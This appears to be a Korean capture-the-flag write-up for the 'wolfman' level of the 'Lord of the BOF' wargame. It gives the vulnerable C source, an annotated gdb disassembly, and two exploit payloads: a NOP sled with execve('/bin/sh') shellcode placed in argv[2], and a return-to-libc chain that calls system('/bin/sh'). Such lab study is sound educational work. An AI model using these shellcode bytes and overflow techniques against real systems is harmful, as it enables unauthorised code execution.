[orc@localhost orc]$ cat wolfman.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - wolfman
        - egghunter + buffer hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
----------------------------------------------
(gdb) disas main
Dump of assembler code for function main:
0x8048500 <main>:       push   %ebp
0x8048501 <main+1>:     mov    %ebp,%esp
0x8048503 <main+3>:     sub    %esp,44
-main함수 프롤로그 + buffer, i 변수 메모리 할당
0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:    jg     0x8048523 <main+35>
-조건문(if)의 조건 확인
0x804850c <main+12>:    push   0x8048640
0x8048511 <main+17>:    call   0x8048410 <printf>
-인자(문자열 주소값) push + printf함수 호출
0x8048516 <main+22>:    add    %esp,4
-인자 삭제
0x8048519 <main+25>:    push   0
0x804851b <main+27>:    call   0x8048420 <exit>
-인자(0) push + exit함수 호출
0x8048520 <main+32>:    add    %esp,4
-인자 삭제
0x8048523 <main+35>:    nop
0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
-for문의 초기문
0x804852b <main+43>:    nop
0x804852c <main+44>:    lea    %esi,[%esi*1]
0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:    lea    %edx,[%eax*4]
0x804853a <main+58>:    mov    %eax,%ds:0x8049760
0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:    jne    0x8048547 <main+71>
-조건문 확인(DWORD PTR [%eax+%edx]이 environ[i])
0x8048545 <main+69>:    jmp    0x8048587 <main+135>
0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:    lea    %edx,[%eax*4]
0x8048551 <main+81>:    mov    %eax,%ds:0x8049760
0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:    push   %edx
0x804855a <main+90>:    call   0x80483f0 <strlen>
-strlen()함수의 인자인 environ[i]를 push + 함수 호출
0x804855f <main+95>:    add    %esp,4
-인자 삭제
0x8048562 <main+98>:    mov    %eax,%eax
0x8048564 <main+100>:   push   %eax
0x8048565 <main+101>:   push   0
-strlen()값, 0 push
0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:   lea    %edx,[%eax*4]
0x8048571 <main+113>:   mov    %eax,%ds:0x8049760
0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:   push   %edx
-environ[i] push
0x804857a <main+122>:   call   0x8048430 <memset>
-함수 호출
0x804857f <main+127>:   add    %esp,12
-인자 삭제
0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
-for문의 반복문
0x8048585 <main+133>:   jmp    0x8048530 <main+48>
-반복
0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:   add    %eax,4
0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:   add    %edx,47
-argv[1][47]을 %edx에 저장
*"add    %eax,4"의 이유는 argv[1]을 찾기 위함이다. 4byte를 더하기 전 %eax에는 argv[0]이 있다.
0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:   je     0x80485b0 <main+176>
-조건문(if)의 조건 확인
0x8048597 <main+151>:   push   0x804864c
0x804859c <main+156>:   call   0x8048410 <printf>
-인자(문자열의 주소) push + 함수 호출
0x80485a1 <main+161>:   add    %esp,4
-인자 삭제
0x80485a4 <main+164>:   push   0
0x80485a6 <main+166>:   call   0x8048420 <exit>
-인자(0) push + 함수 호출
0x80485ab <main+171>:   add    %esp,4
-인자 삭제
0x80485ae <main+174>:   mov    %esi,%esi
0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:   add    %eax,4
0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:   push   %edx
-strcpy()를 위한 인자 argv[1] push
0x80485b9 <main+185>:   lea    %eax,[%ebp-40]
0x80485bc <main+188>:   push   %eax
-인자(buffer) push
0x80485bd <main+189>:   call   0x8048440 <strcpy>
-함수 strcpy() 호출
0x80485c2 <main+194>:   add    %esp,8
-인자 삭제
0x80485c5 <main+197>:   lea    %eax,[%ebp-40]
0x80485c8 <main+200>:   push   %eax
0x80485c9 <main+201>:   push   0x8048669
0x80485ce <main+206>:   call   0x8048410 <printf>
-buffer의 주소값과 문자열("%s\n")의 주소값 push + 함수호출
0x80485d3 <main+211>:   add    %esp,8
-인자 삭제
0x80485d6 <main+214>:   push   40
0x80485d8 <main+216>:   push   0
0x80485da <main+218>:   lea    %eax,[%ebp-40]
0x80485dd <main+221>:   push   %eax
0x80485de <main+222>:   call   0x8048430 <memset>
-인자 push + 함수 memset() 호출
0x80485e3 <main+227>:   add    %esp,12
-인자 삭제
0x80485e6 <main+230>:   leave
0x80485e7 <main+231>:   ret
-main 함수 종료
0x80485e8 <main+232>:   nop
0x80485e9 <main+233>:   nop
End of assembler dump.
(gdb)
-------------------------------------------

1. RTL 공격
2. buffer를 모두 0으로 초기화한다고 해도.. strcpy가 먼저여서 argv[2]를 통한 공격은
  막을 수 없을텐데?
3. RET 뒤에 nop + 쉘 넣어서 공격

[payload]

1. argv[2]를 통한 공격

argv[2]의 주소
	: 0xbffffb4c
buffer[40]+SFP[4]+RET[4]+argc[4]+argv(0)[4]+argv(1)[4]+argv(2)[4]
("\x90"x44 , "\x4c\xfb\xff\xbf")  "\x90"x1000 , [쉘]

쉘:
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80

2. RTL

system함수의 주소
: 0x40058ae0 <__libc_system>

"/bin/sh"의 주소
: 0x400fbff9

buffer[40] + ebp[4] + RET[4] + emptyRET[4] + (addr of "/bin/sh")[4]
"\x90" * 44 + "\xe0\x8a\x05\x40" + "AAAA" + "\xf9\xbf\x0f\x40"